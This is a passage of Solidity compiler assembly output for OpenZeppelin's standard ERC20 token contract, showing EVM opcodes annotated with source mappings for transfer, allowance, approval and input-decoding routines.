tag_99\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3170:3172   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6784:6869  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3152:3173   */\n      mstore\n        /* \"#utility.yul\":3209:3211   */\n      0x25\n        /* \"#utility.yul\":3189:3207   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3182:3212   */\n      mstore\n        /* \"#utility.yul\":3248:3282   */\n      0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77\n        /* \"#utility.yul\":3228:3246   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3221:3283   */\n      mstore\n      shl(0xd8, 0x207a65726f)\n        /* \"#utility.yul\":3299:3317   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3292:3327   */\n      mstore\n        /* \"#utility.yul\":3344:3363   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6784:6869  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n    tag_100:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_99:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6903:6963  _approve(owner, spender, currentAllowance - subtractedValue) */\n      tag_80\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6912:6917  owner */\n      dup3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6919:6926  spender */\n      dup7\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6947:6962  subtractedValue */\n      dup7\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6928:6944  currentAllowance */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6928:6962  currentAllowance - subtractedValue */\n      sub\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6903:6911  _approve */\n      tag_74\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6903:6963  _approve(owner, spender, currentAllowance - subtractedValue) */\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3740:3929  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_56:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3819:3823  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3873:3901  _transfer(owner, to, amount) */\n      tag_73\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3890:3892  to */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3894:3900  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3873:3882  _transfer */\n      tag_81\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3873:3901  _transfer(owner, to, amount) */\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3987:4136  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_61:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4102:4120  _allowances[owner] */\n      swap2\n      dup3\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4076:4083  uint256 */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4102:4120  _allowances[owner] */\n      swap1\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4102:4113  _allowances */\n      0x01\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4102:4120  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4102:4129  _allowances[owner][spender] */\n      swap4\n      swap1\n      swap5\n      and\n      dup3\n      mstore\n      swap2\n      swap1\n      swap2\n      mstore\n      keccak256\n      sload\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3987:4136  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10457:10797  function _approve(address owner, address spender, uint256 amount) internal virtual {... */\n    tag_74:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10558:10577  owner != address(0) */\n      dup4\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10550:10618  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_109\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3576:3578   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10550:10618  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3558:3579   */\n      mstore\n        /* \"#utility.yul\":3615:3617   */\n      0x24\n        /* \"#utility.yul\":3595:3613   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":3588:3618   */\n      mstore\n        /* \"#utility.yul\":3654:3688   */\n      0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n        /* \"#utility.yul\":3634:3652   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3627:3689   */\n      mstore\n      shl(0xe0, 0x72657373)\n        /* \"#utility.yul\":3705:3723   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3698:3732   */\n      mstore\n        /* \"#utility.yul\":3749:3768   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10550:10618  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_100\n        /* \"#utility.yul\":3374:3774   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10550:10618  require(owner != address(0), \"ERC20: approve from the zero address\") */\n    tag_109:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10636:10657  spender != address(0) */\n      dup3\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10628:10696  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_112\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3981:3983   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10628:10696  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3963:3984   */\n      mstore\n        /* \"#utility.yul\":4020:4022   */\n      0x22\n        /* \"#utility.yul\":4000:4018   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3993:4023   */\n      mstore\n        /* \"#utility.yul\":4059:4093   */\n      0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n        /* \"#utility.yul\":4039:4057   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4032:4094   */\n      mstore\n      shl(0xf0, 0x7373)\n        /* \"#utility.yul\":4110:4128   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4103:4135   */\n      mstore\n        /* \"#utility.yul\":4152:4171   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10628:10696  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_100\n        /* \"#utility.yul\":3779:4177   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10628:10696  require(spender != address(0), \"ERC20: approve to the zero address\") */\n    tag_112:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10707:10725  _allowances[owner] */\n      dup4\n      dup2\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10707:10718  _allowances */\n      0x01\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10707:10725  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10707:10734  _allowances[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10707:10743  _allowances[owner][spender] = amount */\n      dup6\n      swap1\n      sstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10758:10790  Approval(owner, spender, amount) */\n      swap1\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup5\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10758:10790  Approval(owner, spender, amount) */\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10758:10790  Approval(owner, spender, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10457:10797  function _approve(address owner, address spender, uint256 amount) internal virtual {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11078:11489  function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {... */\n    tag_79:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11178:11202  uint256 currentAllowance */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11205:11230  allowance(owner, spender) */\n      tag_117\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11215:11220  owner */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11222:11229  spender */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11205:11214  allowance */\n      tag_61\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11205:11230  allowance(owner, spender) */\n      jump\t// in\n    tag_117:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11178:11230  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n      not(0x00)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11244:11260  currentAllowance */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11244:11281  currentAllowance != type(uint256).max */\n      eq\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11240:11483  if (currentAllowance != type(uint256).max) {... */\n      tag_122\n      jumpi\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11325:11331  amount */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11305:11321  currentAllowance */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11305:11331  currentAllowance >= amount */\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11297:11365  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_119\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4384:4386   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11297:11365  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4366:4387   */\n      mstore\n        /* \"#utility.yul\":4423:4425   */\n      0x1d\n        /* \"#utility.yul\":4403:4421   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4396:4426   */\n      mstore\n        /* \"#utility.yul\":4462:4493   */\n      0x45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000\n        /* \"#utility.yul\":4442:4460   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4435:4494   */\n      mstore\n        /* \"#utility.yul\":4511:4529   */\n      0x64\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11297:11365  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_100\n        /* \"#utility.yul\":4182:4535   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11297:11365  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n    tag_119:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11407:11458  _approve(owner, spender, currentAllowance - amount) */\n      tag_122\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11416:11421  owner */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11423:11430  spender */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11451:11457  amount */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11432:11448  currentAllowance */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11432:11457  currentAllowance - amount */\n      sub\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11407:11415  _approve */\n      tag_74\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11407:11458  _approve(owner, spender, currentAllowance - amount) */\n      jump\t// in\n    tag_122:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11168:11489  {... */\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11078:11489  function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7456:8244  function _transfer(address from, address to, uint256 amount) internal virtual {... */\n    tag_81:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7552:7570  from != address(0) */\n      dup4\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7544:7612  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_124\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4742:4744   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7544:7612  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4724:4745   */\n      mstore\n        /* \"#utility.yul\":4781:4783   */\n      0x25\n        /* \"#utility.yul\":4761:4779   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4754:4784   */\n      mstore\n        /* \"#utility.yul\":4820:4854   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":4800:4818   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4793:4855   */\n      mstore\n      shl(0xd8, 0x6472657373)\n        /* \"#utility.yul\":4871:4889   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4864:4899   */\n      mstore\n        /* \"#utility.yul\":4916:4935   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7544:7612  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_100\n        /* \"#utility.yul\":4540:4941   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7544:7612  require(from != address(0), \"ERC20: transfer from the zero address\") */\n    tag_124:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7630:7646  to != address(0) */\n      dup3\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7622:7686  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_127\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5148:5150   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7622:7686  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5130:5151   */\n      mstore\n        /* \"#utility.yul\":5187:5189   */\n      0x23\n        /* \"#utility.yul\":5167:5185   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5160:5190   */\n      mstore\n        /* \"#utility.yul\":5226:5260   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":5206:5224   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5199:5261   */\n      mstore\n      shl(0xe8, 0x657373)\n        /* \"#utility.yul\":5277:5295   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5270:5303   */\n      mstore\n        /* \"#utility.yul\":5320:5339   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7622:7686  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_100\n        /* \"#utility.yul\":4946:5345   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7622:7686  require(to != address(0), \"ERC20: transfer to the zero address\") */\n    tag_127:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7768:7783  _balances[from] */\n      dup4\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7746:7765  uint256 fromBalance */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7768:7783  _balances[from] */\n      swap1\n      dup2\n      mstore\n      0x20\n      dup2\n      swap1\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7801:7822  fromBalance >= amount */\n      dup2\n      dup2\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7793:7865  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_132\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5552:5554   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7793:7865  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5534:5555   */\n      mstore\n        /* \"#utility.yul\":5591:5593   */\n      0x26\n        /* \"#utility.yul\":5571:5589   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5564:5594   */\n      mstore\n        /* \"#utility.yul\":5630:5664   */\n      0x45524332303a207472616e7366657220616d6f756e7420657863656564732062\n        /* \"#utility.yul\":5610:5628   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5603:5665   */\n      mstore\n      shl(0xd0, 0x616c616e6365)\n        /* \"#utility.yul\":5681:5699   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5674:5710   */\n      mstore\n        /* \"#utility.yul\":5727:5746   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7793:7865  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_100\n        /* \"#utility.yul\":5350:5752   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7793:7865  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n    tag_132:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7899:7914  _balances[from] */\n      dup5\n      dup2\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7899:7908  _balances */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7899:7914  _balances[from] */\n      dup2\n      dup2\n      mstore\n      0x20\n      dup2\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7917:7937  fromBalance - amount */\n      dup8\n      dup8\n      sub\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7899:7937  _balances[from] = fromBalance - amount */\n      swap1\n      sstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8114:8127  _balances[to] */\n      swap4\n      dup8\n      and\n      dup1\n      dup4\n      mstore\n      swap2\n      dup5\n      swap1\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8114:8137  _balances[to] += amount */\n      dup1\n      sload\n      dup8\n      add\n      swap1\n      sstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8163:8189  Transfer(from, to, amount) */\n      swap3\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup6\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8114:8127  _balances[to] */\n      swap1\n      swap3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8163:8189  Transfer(from, to, amount) */\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8163:8189  Transfer(from, to, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8200:8237  _afterTokenTransfer(from, to, amount) */\n      tag_122\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":12073:12164  function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {} */\n      jump\n        /* \"#utility.yul\":14:562   */\n    tag_18:\n        /* \"#utility.yul\":126:130   */\n      0x00\n        /* \"#utility.yul\":155:157   */\n      0x20\n        /* \"#utility.yul\":184:186   */\n      dup1\n        /* \"#utility.yul\":173:182   */\n      dup4\n        /* \"#utility.yul\":166:187   */\n      mstore\n        /* \"#utility.yul\":216:222   */\n      dup4\n        /* \"#utility.yul\":210:223   */\n      mload\n        /* \"#utility.yul\":259:265   */\n      dup1\n        /* \"#utility.yul\":254:256   */\n      dup3\n        /* \"#utility.yul\":243:252   */\n      dup6\n        /* \"#utility.yul\":239:257   */\n      add\n        /* \"#utility.yul\":232:266   */\n      mstore\n        /* \"#utility.yul\":284:285   */\n      0x00\n        /* \"#utility.yul\":294:434   */\n    tag_143:\n        /* \"#utility.yul\":308:314   */\n      dup2\n        /* \"#utility.yul\":305:306   */\n      dup2\n        /* \"#utility.yul\":302:315   */\n      lt\n        /* \"#utility.yul\":294:434   */\n      iszero\n      tag_145\n      jumpi\n        /* \"#utility.yul\":403:417   */\n      dup6\n      dup2\n      add\n        /* \"#utility.yul\":399:422   */\n      dup4\n      add\n        /* \"#utility.yul\":393:423   */\n      mload\n        /* \"#utility.yul\":369:386   */\n      dup6\n      dup3\n      add\n        /* \"#utility.yul\":388:390   */\n      0x40\n        /* \"#utility.yul\":365:391   */\n      add\n        /* \"#utility.yul\":358:424   */\n      mstore\n        /* \"#utility.yul\":323:333   */\n      dup3\n      add\n        /* \"#utility.yul\":294:434   */\n      jump(tag_143)\n    tag_145:\n        /* \"#utility.yul\":298:301   */\n      pop\n        /* \"#utility.yul\":483:484   */\n      0x00\n        /* \"#utility.yul\":478:480   */\n      0x40\n        /* \"#utility.yul\":469:475   */\n      dup3\n        /* \"#utility.yul\":458:467   */\n      dup7\n        /* \"#utility.yul\":454:476   */\n      add\n        /* \"#utility.yul\":450:481   */\n      add\n        /* \"#utility.yul\":443:485   */\n      mstore\n        /* \"#utility.yul\":553:555   */\n      0x40\n        /* \"#utility.yul\":546:548   */\n      0x1f\n        /* \"#utility.yul\":542:549   */\n      not\n        /* \"#utility.yul\":537:539   */\n      0x1f\n        /* \"#utility.yul\":529:535   */\n      dup4\n        /* \"#utility.yul\":525:540   */\n      add\n        /* \"#utility.yul\":521:550   */\n      and\n        /* \"#utility.yul\":510:519   */\n      dup6\n        /* \"#utility.yul\":506:551   */\n      add\n        /* \"#utility.yul\":502:556   */\n      add\n        /* \"#utility.yul\":494:556   */\n      swap3\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":14:562   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":567:740   */\n    tag_140:\n        /* \"#utility.yul\":635:655   */\n      dup1\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":684:715   */\n      dup2\n      and\n        /* \"#utility.yul\":674:716   */\n      dup2\n      eq\n        /* \"#utility.yul\":664:734   */\n      tag_147\n      jumpi\n        /* \"#utility.yul\":730:731   */\n      0x00\n        /* \"#utility.yul\":727:728   */\n      dup1\n        /* \"#utility.yul\":720:732   */\n      revert\n        /* \"#utility.yul\":664:734   */\n    tag_147:\n        /* \"#utility.yul\":567:740   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":745:999   */\n    tag_21:\n        /* \"#utility.yul\":813:819   */\n      0x00\n        /* \"#utility.yul\":821:827   */\n      dup1\n        /* \"#utility.yul\":874:876   */\n      0x40\n        /* \"#utility.yul\":862:871   */\n      dup4\n        /* \"#utility.yul\":853:860   */\n      dup6\n        /* \"#utility.yul\":849:872   */\n      sub\n        /* \"#utility.yul\":845:877   */\n      slt\n        /* \"#utility.yul\":842:894   */\n      iszero\n      tag_149\n      jumpi\n        /* \"#utility.yul\":890:891   */\n      0x00\n        /* \"#utility.yul\":887:888   */\n      dup1\n        /* \"#utility.yul\":880:892   */\n      revert\n        /* \"#utility.yul\":842:894   */\n    tag_149:\n        /* \"#utility.yul\":913:942   */\n      tag_150\n        /* \"#utility.yul\":932:941   */\n      dup4\n        /* \"#utility.yul\":913:942   */\n      tag_140\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":903:942   */\n      swap5\n        /* \"#utility.yul\":989:991   */\n      0x20\n        /* \"#utility.yul\":974:992   */\n      swap4\n      swap1\n      swap4\n      add\n        /* \"#utility.yul\":961:993   */\n      calldataload\n      swap4\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":745:999   */\n      jump\t// out\n        /* \"#utility.yul\":1378:1706   */\n    tag_31:\n        /* \"#utility.yul\":1455:1461   */\n      0x00\n        /* \"#utility.yul\":1463:1469   */\n      dup1\n        /* \"#utility.yul\":1471:1477   */\n      0x00\n        /* \"#utility.yul\":1524:1526   */\n      0x60\n        /* \"#utility.yul\":1512:1521   */\n      dup5\n        /* \"#utility.yul\":1503:1510   */\n      dup7\n        /* \"#utility.yul\":1499:1522   */\n      sub\n        /* \"#utility.yul\":1495:1527   */\n      slt\n        /* \"#utility.yul\":1492:1544   */\n      iszero\n      tag_154\n      jumpi\n        /* \"#utility.yul\":1540:1541   */\n      0x00\n        /* \"#utility.yul\":1537:1538   */\n      dup1\n        /* \"#utility.yul\":1530:1542   */\n      revert\n        /* \"#utility.yul\":1492:1544   */\n    tag_154:\n        /* \"#utility.yul\":1563:1592   */\n      tag_155\n        /* \"#utility.yul\":1582:1591   */\n      dup5\n        /* \"#utility.yul\":1563:1592   */\n      tag_140\n      jump\t// in\n    tag_155:\n        /* \"#utility.yul\":1553:1592   */\n      swap3\n      pop\n        /* \"#utility.yul\":1611:1649   */\n      tag_156\n        /* \"#utility.yul\":1645:1647   */\n      0x20\n        /* \"#utility.yul\":1634:1643   */\n      dup6\n        /* \"#utility.yul\":1630:1648   */\n      add\n        /* \"#utility.yul\":1611:1649   */\n      tag_140\n      jump\t// in\n    tag_156:\n        /* \"#utility.yul\":1601:1649   */\n      swap2\n      pop\n        /* \"#utility.yul\":1696:1698   */\n      0x40\n        /* \"#utility.yul\":1685:1694   */\n      dup5\n        /* \"#utility.yul\":1681:1699   */\n      add\n        /* \"#utility.yul\":1668:1700   */\n      calldataload\n        /* \"#utility.yul\":1658:1700   */\n      swap1\n      pop\n        /* \"#utility.yul\":1378:1706   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":1900:2086   */\n    tag_44:\n        /* \"#utility.yul\":1959:1965   */\n      0x00\n        /* \"#utility.yul\":2012:2014   */\n      0x20\n        /* \"#utility.yul\":2000:2009   */\n      dup3\n        /* \"#utility.yul\":1991:1998   */\n      dup5\n        /* \"#utility.yul\":1987:2010   */\n      sub\n        /* \"#utility.yul\":1983:2015   */\n      slt\n        /* \"#utility.yul\":1980:2032   */\n      iszero\n      tag_159\n      jumpi\n        /* \"#utility.yul\":2028:2029   */\n      0x00\n        /* \"#utility.yul\":2025:2026   */\n      dup1\n        /* \"#utility.yul\":2018:2030   */\n      revert\n        /* \"#utility.yul\":1980:2032   */\n    tag_159:\n        /* \"#utility.yul\":2051:2080   */\n      tag_160\n        /* \"#utility.yul\":2070:2079   */\n      dup3\n        /* \"#utility.yul\":2051:2080   */\n      tag_140\n      jump\t// in\n    tag_160:\n        /* \"#utility.yul\":2041:2080   */\n      swap4\n        /* \"#utility.yul\":1900:2086   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2091:2351   */\n    tag_60:\n        /* \"#utility.yul\":2159:2165   */\n      0x00\n        /* \"#utility.yul\":2167:2173   */\n      dup1\n        /* \"#utility.yul\":2220:2222   */\n   